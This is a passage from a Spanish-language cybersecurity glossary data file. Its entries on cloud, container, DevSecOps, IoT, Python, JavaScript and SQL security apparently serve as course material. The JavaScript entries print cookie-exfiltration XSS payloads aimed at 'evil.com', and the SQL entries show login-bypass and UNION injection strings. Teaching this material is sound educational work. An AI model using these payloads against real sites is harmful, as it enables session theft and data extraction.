      "| Cliente | IAM, cifrado, config de S3, parches de la VM |\n" +
      "> ⚠️ La mayoría de las brechas cloud son por **configuración del cliente**, no por fallo del proveedor.",
    examples: [
      "AWS protege el datacenter; tú evitas dejar un bucket público.",
      "El cliente gestiona los permisos IAM y el cifrado de sus datos.",
    ],
    related: ["IAM y políticas", "S3 security", "CloudTrail y GuardDuty"],
  },
  {
    id: 481,
    module: 45,
    term: "IAM y políticas",
    short: "El control de acceso de AWS: quién puede hacer qué sobre qué recurso.",
    detail:
      "**IAM** gestiona identidades (usuarios, **roles**) y **políticas** JSON que conceden permisos. La buena práctica es **mínimo privilegio** y usar **roles** temporales en vez de claves de larga duración.\n" +
      "{ \"Effect\": \"Allow\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::bucket/*\" }\n" +
      "> ⚠️ Políticas con `\"Action\": \"*\"` o `\"Resource\": \"*\"` son un riesgo clásico de sobre-permiso.",
    examples: [
      "Un rol IAM para que una EC2 lea un bucket, sin claves embebidas.",
      "Revisar políticas con Access Analyzer para detectar accesos amplios.",
    ],
    related: ["Modelo de responsabilidad compartida", "Principio de mínimo privilegio", "S3 security"],
  },
  {
    id: 482,
    module: 45,
    term: "S3 security",
    short: "Los buckets de almacenamiento: privados por defecto, pero fáciles de exponer.",
    detail:
      "**S3** guarda objetos en *buckets*. Son privados por defecto, pero una mala política o ACL puede dejarlos **públicos** — origen de incontables filtraciones. Controles clave: **Block Public Access**, **cifrado** (SSE), políticas de bucket restrictivas y versionado.\n" +
      "> ⚠️ 'Bucket público' es uno de los hallazgos más comunes y graves en auditorías cloud.",
    examples: [
      "Activar 'Block Public Access' a nivel de cuenta.",
      "Cifrado por defecto (SSE-KMS) en todos los buckets.",
    ],
    related: ["IAM y políticas", "Modelo de responsabilidad compartida", "VPC y security groups"],
  },
  {
    id: 483,
    module: 45,
    term: "VPC y security groups",
    short: "La red privada virtual y sus firewalls a nivel de instancia.",
    detail:
      "Una **VPC** es tu red aislada en AWS. Dentro, los **security groups** son firewalls **stateful** a nivel de instancia (reglas de entrada/salida) y los **NACLs** filtran a nivel de subred. Segmentar (subredes públicas/privadas) limita el alcance de un compromiso.\n" +
      "> ⚠️ Un security group con `0.0.0.0/0` en el puerto 22 (SSH) expone la instancia a todo Internet.",
    examples: [
      "Base de datos en subred privada, sin IP pública.",
      "Restringir SSH al rango de IPs de la oficina, no a 0.0.0.0/0.",
    ],
    related: ["S3 security", "DMZ y segmentación de red", "CloudTrail y GuardDuty"],
  },
  {
    id: 484,
    module: 45,
    term: "CloudTrail y GuardDuty",
    short: "La auditoría (qué se hizo) y la detección de amenazas gestionada de AWS.",
    detail:
      "• **CloudTrail** — registra **todas las llamadas a la API** de la cuenta: quién hizo qué y cuándo. Es la base de la auditoría y la forense en AWS.\n" +
      "• **GuardDuty** — servicio gestionado que **detecta amenazas** analizando CloudTrail, VPC Flow Logs y DNS (ej. credenciales usadas desde una IP rara, criptominería).\n" +
      "> 💡 Sin CloudTrail habilitado, una investigación post-incidente en AWS es casi ciega.",
    examples: [
      "Detectar con GuardDuty el uso de credenciales IAM desde otro país.",
      "Revisar CloudTrail para ver quién borró un recurso.",
    ],
    related: ["VPC y security groups", "IAM y políticas", "SIEM"],
  },

  // ── M46 · Cloud Security: Azure y GCP ────────────────────────────────────
  {
    id: 490,
    module: 46,
    term: "Azure AD / Entra ID y RBAC",
    short: "El directorio de identidades de Azure y su control de acceso por roles.",
    detail:
      "**Microsoft Entra ID** (antes **Azure AD**) es el directorio de identidades de Azure/Microsoft 365. El acceso a recursos se gobierna con **RBAC** (roles asignados a un *scope*: suscripción, grupo de recursos, recurso) y se refuerza con **Conditional Access** y MFA.\n" +
      "> 💡 Entra ID es el equivalente cloud de Active Directory y un objetivo prioritario de los atacantes.",
    examples: [
      "Asignar el rol 'Reader' a un grupo a nivel de suscripción.",
      "Conditional Access que exige MFA fuera de la red corporativa.",
    ],
    related: ["GCP IAM", "Cloud hardening y CSPM", "Active Directory: dominio, bosque y OU"],
  },
  {
    id: 491,
    module: 46,
    term: "GCP IAM",
    short: "El control de acceso de Google Cloud: identidades, roles y service accounts.",
    detail:
      "En **GCP**, IAM concede **roles** (primitivos, predefinidos o personalizados) a identidades sobre recursos organizados jerárquicamente (organización → carpeta → proyecto → recurso). Las **service accounts** son identidades para cargas de trabajo; sus claves son un objetivo sensible.\n" +
      "> ⚠️ Las claves de service account filtradas son una vía directa de compromiso; preferir identidades sin clave (Workload Identity).",
    examples: [
      "Un rol predefinido 'roles/storage.objectViewer' sobre un proyecto.",
      "Workload Identity para evitar claves de service account.",
    ],
    related: ["Azure AD / Entra ID y RBAC", "IAM y políticas", "Cloud hardening y CSPM"],
  },
  {
    id: 492,
    module: 46,
    term: "Cloud hardening y CSPM",
    short: "Endurecer la configuración cloud y vigilarla de forma continua.",
    detail:
      "El **hardening cloud** aplica buenas prácticas (mínimo privilegio, cifrado, sin recursos públicos, logging). Como la configuración cambia rápido, se usan herramientas **CSPM** (*Cloud Security Posture Management*) que **escanean continuamente** contra benchmarks (CIS) y alertan de desviaciones (un bucket que se volvió público, un puerto abierto).",
    examples: [
      "Prowler/ScoutSuite auditando una cuenta contra el CIS Benchmark.",
      "Una alerta CSPM cuando alguien expone una base de datos.",
    ],
    related: ["Hardening y CIS Benchmarks", "Multi-cloud", "S3 security"],
  },
  {
    id: 493,
    module: 46,
    term: "Multi-cloud",
    short: "Usar varios proveedores a la vez: más resiliencia, más complejidad de seguridad.",
    detail:
      "Una estrategia **multi-cloud** (AWS + Azure + GCP) evita el *lock-in* y mejora la resiliencia, pero **multiplica la superficie**: cada nube tiene su modelo de IAM, su jerga y sus controles. El reto es la **visibilidad y políticas unificadas**, donde el CSPM y una gestión de identidad centralizada ayudan.",
    examples: [
      "Cargas en AWS y backups en GCP para resiliencia.",
      "Un CSPM único que cubre las tres nubes con una sola consola.",
    ],
    related: ["Cloud hardening y CSPM", "Azure AD / Entra ID y RBAC", "GCP IAM"],
  },

  // ── M47 · Container Security ──────────────────────────────────────────────
  {
    id: 500,
    module: 47,
    term: "Seguridad de Docker e imágenes",
    short: "Las imágenes de contenedor deben ser mínimas, sin secretos y de origen confiable.",
    detail:
      "Una **imagen** de contenedor empaqueta app + dependencias en **capas**. Riesgos: imágenes base con vulnerabilidades, **secretos embebidos** (claves en una capa), correr como **root**. Buenas prácticas: imágenes mínimas (distroless), usuario no-root, no incluir secretos.\n" +
      "USER 1000\n" +
      "> ⚠️ Un secreto añadido y luego 'borrado' sigue estando en una **capa anterior** de la imagen.",
    examples: [
      "Usar una imagen distroless en vez de una con todo un SO.",
      "Pasar secretos por variables/volúmenes, nunca dentro de la imagen.",
    ],
    related: ["Image scanning", "Kubernetes security (RBAC)", "Pod security y network policies"],
  },
  {
    id: 501,
    module: 47,
    term: "Image scanning",
    short: "Analizar las imágenes en busca de vulnerabilidades y secretos antes de desplegarlas.",
    detail:
      "El **image scanning** revisa cada capa contra bases de CVEs y busca secretos/malas configuraciones. Herramientas: **Trivy**, **Grype**, **Clair**. Se integra en el pipeline para **bloquear** imágenes con vulnerabilidades críticas antes del despliegue.\n" +
      "trivy image miapp:latest\n" +
      "> 💡 Escanear en el registro y en el CI evita que llegue a producción una imagen vulnerable.",
    examples: [
      "trivy bloqueando un build por una CVE crítica en la imagen base.",
      "Escaneo programado de las imágenes del registro.",
    ],
    related: ["Seguridad de Docker e imágenes", "Dependency scanning (SCA)"],
  },
  {
    id: 502,
    module: 47,
    term: "Kubernetes security (RBAC)",
    short: "Controlar quién y qué puede hacer cada cosa dentro del clúster.",
    detail:
      "**Kubernetes** orquesta contenedores y su seguridad arranca en el **RBAC** del clúster: roles que limitan qué puede hacer cada usuario/service account sobre los recursos (pods, secrets). Otros pilares: proteger el **API server** y el **etcd**, y no dar permisos de cluster-admin a la ligera.\n" +
      "> ⚠️ Un service account con permisos excesivos montado en un pod comprometido = compromiso del clúster.",
    examples: [
      "Un Role que solo permite leer pods en un namespace.",
      "Deshabilitar el automount del token de service account cuando no se usa.",
    ],
    related: ["Pod security y network policies", "Seguridad de Docker e imágenes", "Principio de mínimo privilegio"],
  },
  {
    id: 503,
    module: 47,
    term: "Pod security y network policies",
    short: "Restringir lo que un pod puede hacer y con quién puede hablar.",
    detail:
      "Dos controles clave dentro del clúster:\n" +
      "• **Pod Security** (Standards/admission) — impide pods privilegiados, root, o con acceso al host.\n" +
      "• **Network Policies** — firewall entre pods: por defecto todo se habla con todo; una política restringe el tráfico (ej. el frontend solo habla con el backend).\n" +
      "> 💡 Sin network policies, un pod comprometido puede moverse lateralmente a todo el clúster.",
    examples: [
      "Una NetworkPolicy que aísla la base de datos del resto de pods.",
      "Bloquear pods privilegiados con Pod Security Admission.",
    ],
    related: ["Kubernetes security (RBAC)", "DMZ y segmentación de red", "Seguridad de Docker e imágenes"],
  },

  // ── M48 · DevSecOps y CI/CD ──────────────────────────────────────────────
  {
    id: 510,
    module: 48,
    term: "Shift-left",
    short: "Integrar la seguridad desde el inicio del desarrollo, no al final.",
    detail:
      "**Shift-left** desplaza la seguridad **hacia la izquierda** del ciclo de vida: en vez de auditar al final (caro y tardío), se valida desde el **diseño y el código**. La idea: encontrar y arreglar fallos **lo antes posible**, cuando cuestan mucho menos.\n" +
      "> 💡 Un bug de seguridad cuesta órdenes de magnitud más arreglarlo en producción que en el código.",
    examples: [
      "Threat modeling en la fase de diseño de una feature.",
      "Linters de seguridad que corren en cada commit.",
    ],
    related: ["SAST y DAST", "Infrastructure as Code (IaC)"],
  },
  {
    id: 511,
    module: 48,
    term: "SAST y DAST",
    short: "Analizar el código (estático) y la app corriendo (dinámico) en busca de fallos.",
    detail:
      "Dos enfoques complementarios:\n" +
      "| | SAST | DAST |\n" +
      "|---|---|---|\n" +
      "| Qué analiza | El código fuente | La app en ejecución |\n" +
      "| Cuándo | Temprano (sin ejecutar) | Más tarde (app desplegada) |\n" +
      "| Ve | Bugs en el código | Fallos visibles desde fuera |\n" +
      "Ejemplos: **Semgrep/SonarQube** (SAST), **OWASP ZAP** (DAST).",
    examples: [
      "Semgrep detectando una query SQL concatenada (SAST).",
      "OWASP ZAP probando XSS contra el entorno de staging (DAST).",
    ],
    related: ["Shift-left", "Dependency scanning (SCA)"],
  },
  {
    id: 512,
    module: 48,
    term: "Dependency scanning (SCA)",
    short: "Detectar vulnerabilidades conocidas en las librerías de terceros.",
    detail:
      "El **SCA** (*Software Composition Analysis*) inventaría las **dependencias** y las compara con bases de CVEs, ya que el grueso del código moderno es de terceros (OWASP A06). Herramientas: **Dependabot**, **Snyk**, `npm audit`. También vigila licencias.\n" +
      "npm audit --audit-level=high\n" +
      "> 💡 Es la defensa directa contra el riesgo 'Vulnerable and Outdated Components' del OWASP Top 10.",
    examples: [
      "Dependabot abriendo un PR para parchear una librería con CVE.",
      "Bloquear el build si hay una dependencia con vuln crítica.",
    ],
    related: ["Vulnerable and Outdated Components", "Image scanning"],
  },
  {
    id: 513,
    module: 48,
    term: "Seguridad del pipeline y secretos",
    short: "El propio CI/CD es un objetivo: protege sus credenciales y su integridad.",
    detail:
      "El pipeline de CI/CD tiene acceso a código, credenciales y producción, así que es un blanco (cadena de suministro). Controles: **gestión de secretos** (vaults, no en el repo), **mínimo privilegio** de los runners, **firmar artefactos** y proteger la configuración del pipeline.\n" +
      "> ⚠️ Un secreto hardcodeado en el repo o en logs del CI es de los hallazgos más explotados.",
    examples: [
      "Inyectar secretos desde un vault, nunca commitearlos.",
      "Escaneo de secretos (gitleaks) en cada push.",
    ],
    related: ["Software and Data Integrity Failures", "Infrastructure as Code (IaC)"],
  },
  {
    id: 514,
    module: 48,
    term: "Infrastructure as Code (IaC)",
    short: "Definir la infraestructura en código permite versionarla y escanearla.",
    detail:
      "La **IaC** (Terraform, CloudFormation) declara la infraestructura como **código**, lo que la hace **reproducible, versionable y auditable**. Su seguridad: **escanear** las plantillas (tfsec, Checkov) para detectar malas configuraciones (un bucket público, un SG abierto) **antes** de desplegar.\n" +
      "tfsec ./infra\n" +
      "> 💡 Arreglar una mala config en el código IaC la corrige en todos los entornos a la vez.",
    examples: [
      "Checkov detectando un security group con 0.0.0.0/0 en el plan.",
      "Revisar el plan de Terraform en el PR antes del apply.",
    ],
    related: ["Seguridad del pipeline y secretos", "Cloud hardening y CSPM", "Shift-left"],
  },

  // ── M49 · IoT y Mobile Security ──────────────────────────────────────────
  {
    id: 520,
    module: 49,
    term: "OWASP IoT Top 10",
    short: "Los 10 riesgos más comunes en dispositivos del Internet de las Cosas.",
    detail:
      "El **OWASP IoT Top 10** lista las debilidades típicas del IoT, encabezadas por las **contraseñas débiles/por defecto**, **servicios de red inseguros** y la **falta de actualización segura**. El IoT combina lo peor de varios mundos: hardware barato, software sin parchear y exposición a Internet.\n" +
      "> 💡 Ver el diagrama 'OWASP IoT Top 10' más abajo con los 10 riesgos y su mitigación.",
    examples: [
      "Una cámara IP con usuario/clave 'admin/admin' expuesta a Internet.",
      "Un dispositivo sin mecanismo de actualización de firmware.",
    ],
    related: ["Análisis de firmware", "Seguridad Android (APK)", "BLE y hardware hacking"],
  },
  {
    id: 521,
    module: 49,
    term: "Análisis de firmware",
    short: "Extraer y examinar el software embebido de un dispositivo para hallar fallos y secretos.",
    detail:
      "El **firmware** es el software que corre en el dispositivo. Analizarlo revela **credenciales hardcodeadas**, claves, binarios vulnerables y backdoors. Se **extrae** (de la web del fabricante o leyendo la flash) y se **desempaqueta** con herramientas como **binwalk**.\n" +
      "binwalk -e firmware.bin\n" +
      "> ⚠️ Es habitual encontrar claves privadas o contraseñas en claro dentro del sistema de archivos del firmware.",
    examples: [
      "binwalk extrayendo el sistema de archivos de un router.",
      "Hallar una clave SSH embebida en el firmware.",
    ],
    related: ["OWASP IoT Top 10", "BLE y hardware hacking", "Análisis estático"],
  },
  {
    id: 522,
    module: 49,
    term: "Seguridad Android (APK)",
    short: "Las apps Android se empaquetan en APK, decompilables para análisis de seguridad.",
    detail:
      "Una app **Android** es un **APK** (un ZIP con código DEX, recursos y el manifest). Se **decompila** (jadx, apktool) para revisar permisos excesivos, **secretos embebidos**, endpoints y lógica insegura. El **OWASP Mobile Top 10** guía qué buscar (almacenamiento inseguro, criptografía débil).\n" +
      "jadx -d salida/ app.apk\n" +
      "> ⚠️ Las API keys hardcodeadas en el APK son triviales de extraer: el cliente nunca es de confianza.",
    examples: [
      "Decompilar un APK con jadx y encontrar una clave de API.",
      "Revisar AndroidManifest.xml por permisos y componentes exportados.",
    ],
    related: ["Seguridad iOS", "OWASP IoT Top 10", "Análisis estático"],
  },
  {
    id: 523,
    module: 49,
    term: "Seguridad iOS",
    short: "El modelo cerrado de iOS: sandbox fuerte, pero con sus propios vectores.",
    detail:
      "**iOS** tiene un modelo más cerrado: apps en **sandbox**, firma obligatoria y App Store revisada. El análisis es más difícil (suele requerir **jailbreak** o un dispositivo de pruebas). Riesgos comunes: **almacenamiento inseguro** en el Keychain mal usado, criptografía débil y fugas por logs o backups.",
    examples: [
      "Revisar el uso del Keychain para datos sensibles.",
      "Analizar el tráfico de la app con un proxy y certificado propio.",
    ],
    related: ["Seguridad Android (APK)", "OWASP IoT Top 10", "Certificate transparency y pinning"],
  },
  {
    id: 524,
    module: 49,
    term: "BLE y hardware hacking",
    short: "Atacar el dispositivo por sus interfaces físicas e inalámbricas de corto alcance.",
    detail:
      "Más allá del software, el dispositivo se ataca por su **hardware**:\n" +
      "• **BLE** (Bluetooth Low Energy) — sniffing y replay de la comunicación inalámbrica.\n" +
      "• **Interfaces de depuración** — **UART**, **JTAG/SWD** dan acceso de consola o a la memoria.\n" +
      "• **Dump de flash** — leer el chip de memoria directamente para extraer el firmware.\n" +
      "> 💡 Un pin de UART en la placa suele dar una shell de root sin autenticación.",
    examples: [
      "Conectarse por UART para obtener una consola del dispositivo.",
      "Sniffar BLE para capturar comandos entre app y dispositivo.",
    ],
    related: ["Análisis de firmware", "OWASP IoT Top 10", "Estándares de seguridad WiFi"],
  },

  // ── M50 · Proyecto Final y Carrera ───────────────────────────────────────
  {
    id: 530,
    module: 50,
    term: "Auditoría end-to-end",
    short: "Aplicar todo lo aprendido en un ejercicio completo, del recon al reporte.",
    detail:
      "El proyecto final integra el ciclo completo: **reconocimiento → escaneo → enumeración → explotación → post-explotación → reporte**, sobre un objetivo autorizado (un laboratorio o CTF). Demuestra no solo saber usar herramientas, sino **encadenar** hallazgos y **comunicar** el impacto.\n" +
      "> 💡 Practica en entornos legales: HackTheBox, TryHackMe, VulnHub o laboratorios propios.",
    examples: [
      "Comprometer una máquina de HackTheBox y documentar el proceso.",
      "Una auditoría de caja negra de principio a fin en un lab.",
    ],
    related: ["Reporte profesional", "Portfolio y carrera"],
  },
  {
    id: 531,
    module: 50,
    term: "Reporte profesional",
    short: "El entregable real de un pentest: comunica riesgo y remediación, no solo técnica.",
    detail:
      "El **reporte** es el producto que paga el cliente. Estructura típica: **resumen ejecutivo** (para dirección, sin jerga), **alcance y metodología**, **hallazgos** con severidad (**CVSS**) y **evidencia (PoC)**, y **recomendaciones** priorizadas.\n" +
      "> 💡 Un hallazgo crítico mal comunicado no se arregla: saber **escribir** vale tanto como saber explotar. Ver el diagrama de estructura del reporte.",
    examples: [
      "Un resumen ejecutivo que un CEO entiende en 2 minutos.",
      "Cada hallazgo con impacto, evidencia y pasos de remediación.",
    ],
    related: ["Auditoría end-to-end", "CVE y CVSS", "Plan de certificaciones"],
  },
  {
    id: 532,
    module: 50,
    term: "Plan de certificaciones",
    short: "Una ruta de certificaciones acorde a la especialización elegida.",
    detail:
      "Las certificaciones **estructuran el aprendizaje** y abren puertas. La ruta depende de la **rama**: ofensiva (eJPT → PNPT/OSCP), defensiva (Security+ → BTL1 → GCIH), cloud, GRC, etc. Conviene empezar por **fundamentos** (Security+) y subir según el objetivo.\n" +
      "> 💡 Ver la sección de certificaciones de la academia: catálogo por track y nivel.",
    examples: [
      "Empezar con eJPT y apuntar a OSCP para pentesting.",
      "Security+ como base transversal antes de especializarse.",
    ],
    related: ["Portfolio y carrera", "Reporte profesional"],
  },
  {
    id: 533,
    module: 50,
    term: "Portfolio y carrera",
    short: "Demostrar habilidades con evidencia pública es tan valioso como los títulos.",
    detail:
      "Un **portfolio** prueba lo que sabes hacer: **writeups** de CTFs y máquinas, contribuciones open source, un blog técnico, perfil de **TryHackMe/HackTheBox**, **bug bounties**. Combinado con networking (conferencias, comunidades), suele pesar tanto como el CV formal.\n" +
      "> 💡 'Show, don't tell': un buen writeup vale más que una línea en el currículum.",
    examples: [
      "Un repositorio con writeups de máquinas resueltas.",
      "Reportes válidos en programas de bug bounty.",
    ],
    related: ["Plan de certificaciones", "CTF y práctica deliberada", "Auditoría end-to-end"],
  },
  {
    id: 534,
    module: 50,
    term: "CTF y práctica deliberada",
    short: "Los Capture The Flag entrenan habilidades reales de forma legal y gamificada.",
    detail:
      "Los **CTF** (*Capture The Flag*) son retos de seguridad legales y gamificados: **Jeopardy** (categorías: web, cripto, forense, pwn, reversing) o **Attack-Defense**. Son la mejor forma de **practicar deliberadamente** y mantenerse afilado; diseñar uno propio demuestra dominio.",
    examples: [
      "Resolver retos de pwn y web en un CTF de fin de semana.",
      "Diseñar un CTF para enseñar a otros (nivel avanzado).",
    ],
    related: ["Portfolio y carrera", "Auditoría end-to-end", "Reporte profesional"],
  },

  // ── M51 · Python para Ciberseguridad ─────────────────────────────────────
  {
    id: 540,
    module: 51,
    term: "Python en seguridad",
    short: "El lenguaje de facto del hacking: simple, con un ecosistema enorme y prototipado rápido.",
    detail:
      "**Python** domina la ciberseguridad por su **sintaxis legible**, su **enorme ecosistema** de librerías y la rapidez para **prototipar herramientas**. Se usa en pentesting, análisis de malware, forense, automatización y exploit development.\n" +
      "> 💡 La mayoría de las herramientas ofensivas modernas (o sus PoCs) están escritas en Python.",
    examples: [
      "Un escáner de puertos en 10 líneas con sockets.",
      "Automatizar el parseo de la salida de nmap.",
    ],
    related: ["Sockets y networking", "Scapy y requests", "Automatización de pentesting"],
  },
  {
    id: 541,
    module: 51,
    term: "Sockets y networking",
    short: "La librería socket permite hablar TCP/UDP directamente: la base de las herramientas de red.",
    detail:
      "El módulo **`socket`** da control de bajo nivel sobre conexiones TCP/UDP, base de escáneres y clientes/servidores. `connect_ex` devuelve 0 si el puerto está abierto.\n" +
      "import socket\n" +
      "def open(ip, port):\n" +
      "    s = socket.socket(); s.settimeout(1)\n" +
      "    r = s.connect_ex((ip, port)); s.close()\n" +
      "    return r == 0",
    examples: [
      "Un port scanner que recorre range(1, 1025).",
      "Un cliente que envía un banner-grab a un servicio.",
    ],
    related: ["Python en seguridad", "Scapy y requests", "Tipos de escaneo Nmap"],
  },
  {
    id: 542,
    module: 51,
    term: "Scapy y requests",
    short: "Dos librerías estrella: crafting de paquetes (Scapy) y HTTP de alto nivel (requests).",
    detail:
      "• **Scapy** — crea, envía y diseca **paquetes** a voluntad (escaneos custom, spoofing, sniffing).\n" +
      "• **requests** — cliente **HTTP** sencillo para interactuar con webs/APIs (fuzzing, scraping, auth).\n" +
      "from scapy.all import IP, TCP, sr1\n" +
      "ans = sr1(IP(dst='10.0.0.5')/TCP(dport=80, flags='S'), timeout=1)",
    examples: [
      "Un SYN scan con Scapy sin depender de nmap.",
      "requests.get(url) para inspeccionar headers de respuesta.",
    ],
    related: ["Sockets y networking", "Librerías clave de seguridad", "Análisis de PCAP"],
  },
  {
    id: 543,
    module: 51,
    term: "Librerías clave de seguridad",
    short: "El ecosistema que convierte a Python en una navaja suiza ofensiva y defensiva.",
    detail:
      "| Librería | Uso |\n" +
      "|---|---|\n" +
      "| impacket | Protocolos Windows (SMB, NTLM, Kerberos) |\n" +
      "| paramiko | Cliente SSH |\n" +
      "| pwntools | Exploit development (CTF/pwn) |\n" +
      "| pycryptodome | Cifrado |\n" +
      "| yara-python | Detección de malware |\n" +
      "| volatility3 | Forense de memoria |\n" +
      "> 💡 `impacket` y `pwntools` son omnipresentes en pentesting de AD y en exploiting.",
    examples: [
      "impacket para un psexec.py con un hash robado.",
      "pwntools para automatizar la explotación de un binario.",
    ],
    related: ["Scapy y requests", "Automatización de pentesting", "Movimiento lateral"],
  },
  {
    id: 544,
    module: 51,
    term: "Automatización de pentesting",
    short: "Encadenar escaneo, parseo y explotación en scripts repetibles.",
    detail:
      "El valor de Python en pentest es **automatizar lo tedioso**: lanzar herramientas, **parsear** su salida, correlacionar y disparar el siguiente paso. Convierte un flujo manual de horas en un comando reproducible.\n" +
      "> 💡 Automatizar también reduce errores y hace el trabajo auditable y repetible.",
    examples: [
      "Un script que corre nmap, extrae puertos abiertos y lanza enumeración.",
      "Orquestar una cadena recon → escaneo → reporte.",
    ],
    related: ["Python en seguridad", "Librerías clave de seguridad"],
  },

  // ── M52 · Python Avanzado para Seguridad ─────────────────────────────────
  {
    id: 550,
    module: 52,
    term: "Regex y parsing de logs",
    short: "Las expresiones regulares extraen información estructurada de texto desordenado.",
    detail:
      "Gran parte del trabajo de seguridad es **procesar logs**. Las **expresiones regulares** (`re`) extraen IPs, fechas, errores y patrones de millones de líneas.\n" +
      "import re\n" +
      "ips = re.findall(r'\\d+\\.\\d+\\.\\d+\\.\\d+', open('auth.log').read())\n" +
      "> 💡 Combinado con `collections.Counter`, en pocas líneas se obtiene el top de IPs atacantes.",
    examples: [
      "Extraer todas las IPs de logins fallidos de un log.",
      "Parsear timestamps para construir una timeline.",
    ],
    related: ["El trío grep / awk / sed", "APIs de threat intel", "Tool building en Python"],
  },
  {
    id: 551,
    module: 52,
    term: "cryptography en Python",
    short: "Implementar y romper cifrado con librerías como cryptography y pycryptodome.",
    detail:
      "Las librerías **`cryptography`** y **`pycryptodome`** dan primitivas listas (AES, RSA, hashing, HMAC) para herramientas defensivas y para retos de cripto en CTF. Evitan el antipatrón de 'rodar tu propia cripto'.\n" +
      "> ⚠️ Usar las primitivas de alto nivel (Fernet) en vez de ensamblar AES a mano reduce errores fatales (IV reuse, padding).",
    examples: [
      "Cifrar un archivo de configuración con Fernet.",
      "Resolver un reto de cripto descifrando con una clave hallada.",
    ],
    related: ["Cifrado simétrico", "Tool building en Python", "Regex y parsing de logs"],
  },
  {
    id: 552,
    module: 52,
    term: "APIs de threat intel",
    short: "Automatizar consultas a servicios como VirusTotal y Shodan enriquece el análisis.",
    detail:
      "Python consume **APIs** de inteligencia para enriquecer indicadores: **VirusTotal** (reputación de hashes/URLs), **Shodan** (hosts expuestos), AbuseIPDB. Permite enriquecer una alerta o un IoC de forma masiva y automática.\n" +
      "import requests\n" +
      "r = requests.get(f'https://www.virustotal.com/api/v3/files/{h}', headers={'x-apikey': KEY})",
    examples: [
      "Consultar VirusTotal por el hash de una muestra.",
      "Buscar en Shodan los servidores de una organización.",
    ],
    related: ["Threat intelligence", "Shodan y Censys", "Tool building en Python"],
  },
  {
    id: 553,
    module: 52,
    term: "Tool building en Python",
    short: "Convertir un script en una herramienta usable: argumentos, estructura y manejo de errores.",
    detail:
      "Una herramienta seria va más allá del script: **`argparse`** para argumentos CLI, estructura en funciones/módulos, manejo de errores y salida clara. Así la usan otros y se integra en pipelines.\n" +
      "import argparse\n" +
      "p = argparse.ArgumentParser(); p.add_argument('-t', '--target')",
    examples: [
      "Una CLI con --target y --ports y ayuda automática.",
      "Empaquetar la herramienta para distribuirla (pip).",
    ],
    related: ["Regex y parsing de logs", "APIs de threat intel", "Automatización de pentesting"],
  },

  // ── M53 · JavaScript y Seguridad Web ─────────────────────────────────────
  {
    id: 560,
    module: 53,
    term: "Fundamentos de JavaScript",
    short: "El lenguaje del navegador: entenderlo es clave para atacar y defender la web.",
    detail:
      "**JavaScript** corre en el navegador de cada usuario, por lo que es el medio de los ataques **del lado del cliente** (XSS, clickjacking). Entender su sintaxis, el event loop y el DOM es imprescindible tanto para el atacante como para auditar código frontend.",
    examples: [
      "Leer y entender el JS de una SPA para hallar endpoints ocultos.",
      "Auditar una función de sanitización del lado del cliente.",
    ],
    related: ["DOM manipulation", "XSS desde el atacante", "Node.js security"],
  },
  {
    id: 561,
    module: 53,
    term: "DOM manipulation",
    short: "El JS puede leer y modificar la página viva — incluidas las cookies y el contenido.",
    detail:
      "El **DOM** es la representación viva de la página. JavaScript puede **leerlo y modificarlo**: cambiar contenido, leer `document.cookie`, redirigir. Es justo lo que abusa un XSS para robar sesión o alterar la página.\n" +
      "document.location = 'http://evil.com?c=' + document.cookie\n" +
      "> ⚠️ Por eso las cookies de sesión deben ser **HttpOnly**: inaccesibles desde el DOM.",
    examples: [
      "Un payload que exfiltra document.cookie a un servidor del atacante.",
      "Modificar el DOM para insertar un formulario de login falso.",
    ],
    related: ["Fundamentos de JavaScript", "XSS desde el atacante", "Cookie security"],
  },
  {
    id: 562,
    module: 53,
    term: "XSS desde el atacante",
    short: "Ver el XSS desde la ofensiva: qué se puede lograr inyectando JavaScript.",
    detail:
      "Desde la perspectiva ofensiva, un **XSS** ejecuta JS en el contexto de la víctima: **robo de sesión**, keylogging, acciones en su nombre, o un BeEF hook para controlar el navegador. La gravedad depende de qué pueda hacer ese usuario.\n" +
      "<img src=x onerror=\"fetch('//evil/'+document.cookie)\">",
    examples: [
      "Stored XSS en un comentario que roba la sesión de quien lo lee.",
      "Encadenar XSS + CSRF para acciones privilegiadas.",
    ],
    related: ["Cross-Site Scripting (XSS)", "DOM manipulation", "Prevención de inyección"],
  },
  {
    id: 563,
    module: 53,
    term: "Node.js security",
    short: "JS también corre en el servidor: nuevos riesgos (inyección de comandos, deps).",
    detail:
      "Con **Node.js**, JavaScript corre en el **servidor**, con sus propios riesgos: **inyección de comandos** (`child_process`), **prototype pollution**, deserialización insegura y un árbol de **dependencias npm** enorme (supply chain). El `npm audit` y evitar `eval`/`exec` con entrada de usuario son básicos.\n" +
      "> ⚠️ Pasar entrada de usuario a `child_process.exec` es RCE directo.",
    examples: [
      "Una API Node vulnerable a inyección de comandos por exec.",
      "Una dependencia npm comprometida (supply chain).",
    ],
    related: ["Fundamentos de JavaScript", "Dependency scanning (SCA)", "Injection"],
  },

  // ── M54 · SQL y Seguridad de Bases de Datos ──────────────────────────────
  {
    id: 570,
    module: 54,
    term: "Fundamentos de SQL",
    short: "El lenguaje de las bases de datos relacionales: saberlo es requisito para atacarlas y protegerlas.",
    detail:
      "**SQL** consulta y manipula bases de datos relacionales (`SELECT`, `INSERT`, `WHERE`, `UNION`, `JOIN`). Entender cómo se construye una consulta es lo que permite ver **dónde** la entrada del usuario puede romperla (inyección).\n" +
      "SELECT * FROM users WHERE user = 'alice' AND pass = '...';",
    examples: [
      "Una consulta de login que concatena usuario y contraseña.",
      "Un UNION SELECT para combinar resultados de otra tabla.",
    ],
    related: ["SQL Injection manual", "Blind y time-based SQLi", "Database hardening"],
  },
  {
    id: 571,
    module: 54,
    term: "SQL Injection manual",
    short: "Inyectar SQL a mano para entender qué hace cada payload, no solo lanzar sqlmap.",
    detail:
      "Explotar **a mano** enseña la mecánica: romper la consulta con una comilla, comentar el resto, y usar **UNION** para extraer datos.\n" +
      "' OR 1=1 -- \n" +
      "' UNION SELECT username, password FROM users -- \n" +
      "> 💡 Dominar el SQLi manual permite hacer **WAF bypass** donde las herramientas automáticas fallan.",
    examples: [
      "Saltarse un login con ' OR 1=1 --.",
      "Extraer columnas con ORDER BY y luego UNION SELECT.",
    ],
    related: ["SQL Injection", "Blind y time-based SQLi", "Fundamentos de SQL"],
  },
  {
    id: 572,
    module: 54,
    term: "Blind y time-based SQLi",
    short: "Cuando no se ven los datos, se infieren por respuestas booleanas o por tiempo.",
    detail:
      "Si la app no muestra el resultado, el SQLi es **a ciegas**:\n" +
      "• **Booleano** — la página cambia según si la condición es verdadera o falsa.\n" +
